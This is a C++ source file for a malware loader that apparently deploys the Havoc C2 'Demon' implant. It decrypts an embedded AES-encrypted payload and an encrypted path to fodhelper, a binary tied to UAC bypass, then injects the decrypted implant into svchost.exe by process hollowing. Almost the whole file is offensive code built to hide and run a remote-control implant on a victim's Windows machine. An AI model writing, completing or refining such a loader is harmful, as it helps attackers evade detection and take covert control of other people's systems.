#include <iostream>
#include <vector>
#include <iomanip>
#include "easCipher42.hpp"
#include "crypto_funcs.hpp"
#include "process_hollower.hpp"
#include "demon.x64.h"

int main() {
    std::cout << "=== HAVOC AES Loader ===\n";
    
    std::cout << "[+] payload_enc: " << payload_enc_len << "b [";
    std::cout << bytes_to_hex(payload_enc, 8) << "..." << bytes_to_hex(payload_enc + payload_enc_len - 8, 8) << "]\n";
    
    std::cout << "[+] fodhelper_enc: " << fodhelper_enc_len << "b [";
    std::cout << bytes_to_hex(fodhelper_enc, 8) << "..." << bytes_to_hex(fodhelper_enc + fodhelper_enc_len - 8, 8) << "]\n\n";
    
    easCipher42 cipher;
    if (!cipher.Init(payload_enc, payload_enc_len)) {
        std::cout << "[-] Init FAILED\n"; return -1;
    }
    
    std::cout << "[+] seed (42 bytes): " << bytes_to_hex(cipher.GetSeed(), 42) << "\n";
    std::cout << "[+] salt (dyn): " << bytes_to_hex(cipher.GetSalt(), 16) << "\n";
    std::cout << "[+] key (aes256): " << bytes_to_hex(cipher.GetKey(), 32) << "\n";
    std::cout << "[+] iv (cbc): " << bytes_to_hex(cipher.GetIV(), 16) << "\n\n";
    
    cipher.SetFodhelper(fodhelper_enc, fodhelper_enc_len);
    
    std::vector<uint8_t> fodpath;
    cipher.Decrypt(cipher.GetFodhelperEnc(), cipher.GetFodhelperEncLen(), fodpath);
    std::cout << "[+] fodhelper PATH: ";
    for (auto c : fodpath) std::cout << (char)c;
    std::cout << "\n\n";
    
    // **DECRYPT PAYLOAD** (skip seed 42 bytes)
    std::vector<uint8_t> demon_payload;
    size_t demon_enc_size = payload_enc_len - 42;
    if (!cipher.Decrypt(payload_enc + 42, demon_enc_size, demon_payload)) {
        std::cout << "[-] Demon payload decrypt FAILED\n";
        return -1;
    }
    
    std::cout << "[+] Demon payload OK (" << demon_payload.size() << "b)\n";
    std::cout << "    First 16b: " << bytes_to_hex(demon_payload.data(), 16) << "\n";
    std::cout << "    Expected: 56 48 89 e6 48 83 ec 20 (x64 PE)\n\n";
    
    // Process hollowing
    ProcessHollower hollower;
    if (hollower.HollowProcess(L"C:\\Windows\\System32\\svchost.exe", demon_payload)) {
        std::cout << "[+] Process hollowing SUCCESS\n";
    }
    
    return 0;
}
